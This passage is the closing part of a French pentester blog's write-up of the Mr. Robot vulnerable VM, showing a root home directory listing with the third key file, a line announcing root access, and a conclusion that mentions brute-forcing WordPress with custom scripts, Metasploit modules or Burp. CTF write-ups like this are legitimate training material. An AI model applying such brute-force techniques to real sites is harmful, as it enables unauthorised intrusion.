<span class="line"><span>-rw------- 1 root root 4058 Nov 14 2015 .bash_history</span></span>
<span class="line"><span>-rw-r--r-- 1 root root 3274 Sep 16 2015 .bashrc</span></span>
<span class="line"><span>drwx------ 2 root root 4096 Nov 13 2015 .cache</span></span>
<span class="line"><span>-rw-r--r-- 1 root root 0 Nov 13 2015 firstboot_done</span></span>
<span class="line"><span>-r-------- 1 root root 33 Nov 13 2015 key-3-of-3.txt</span></span>
<span class="line"><span>-rw-r--r-- 1 root root 140 Feb 20 2014 .profile</span></span>
<span class="line"><span>-rw------- 1 root root 1024 Sep 16 2015 .rnd</span></span></code></pre></div><p>And voila ! Nous sommes root sur la machine !</p><h2 id="conclusion" tabindex="-1">Conclusion <a class="header-anchor" href="#conclusion" aria-label="Permalink to &quot;Conclusion&quot;">​</a></h2><p>Avec du recul, il n&#39;était pas nécessaire de coder des scripts qui bruteforcent le wordpress, il existe des modules metasploit qui font ceci, un outil comme Burp peut aussi faire l&#39;affaire. Ce petit challenge est très simple et assez accessible, l’environnement est fidèle à l&#39;esprit de la série, même si on peux regretter le manque de reverse/exploitation</p></div></div></main><footer class="VPDocFooter" data-v-e6f2a212 data-v-1bcd8184><!--[--><!--]--><!----><!----></footer><!--[--><!--]--></div></div></div><!--[--><!--]--></div></div><!----><!--[--><!--]--></div></div>
    <script>window.__VP_HASH_MAP__=JSON.parse("{\"api-examples.md\":\"CZMwDm7k\",\"articles_bypass-nx-ret2libc-binaire-x86.md\":\"CO3cONEE\",\"articles_exploitation-binaire-x86-sans-protections.md\":\"C0CKFp9n\",\"articles_fin-de-hackdumb.md\":\"BLBy9NDK\",\"articles_index.md\":\"DKvF9Q-f\",\"articles_un-nouveau-blog.md\":\"DJ3GLHQS\",\"cve_index.md\":\"C1BHcQ4z\",\"index.md\":\"BgUfzLWz\",\"markdown-examples.md\":\"BumudoiO\",\"writeups_index.md\":\"BMxmvIKl\",\"writeups_vm-mr-robot.md\":\"D5C2l6Tl\"}");window.__VP_SITE_DATA__=JSON.parse("{\"lang\":\"en-US\",\"dir\":\"ltr\",\"title\":\"shoxxdj.fr\",\"description\":\"Le blog d'un pentester bidouilleur\",\"base\":\"/\",\"head\":[],\"router\":{\"prefetchLinks\":true},\"appearance\":true,\"themeConfig\":{\"nav\":[{\"text\":\"Home\",\"link\":\"/\"},{\"text\":\"Writeups\",\"link\":\"/writeups\"},{\"text\":\"CVE\",\"link\":\"/cve\"},{\"text\":\"Articles\",\"link\":\"/articles\"}],\"socialLinks\":[{\"icon\":\"github\",\"link\":\"https://github.com/shoxxdj\"},{\"icon\":\"twitter\",\"link\":\"https://x.com/shoxxdj\"}]},\"locales\":{},\"scrollOffset\":134,\"cleanUrls\":false}");</script>
    
  </body>
</html>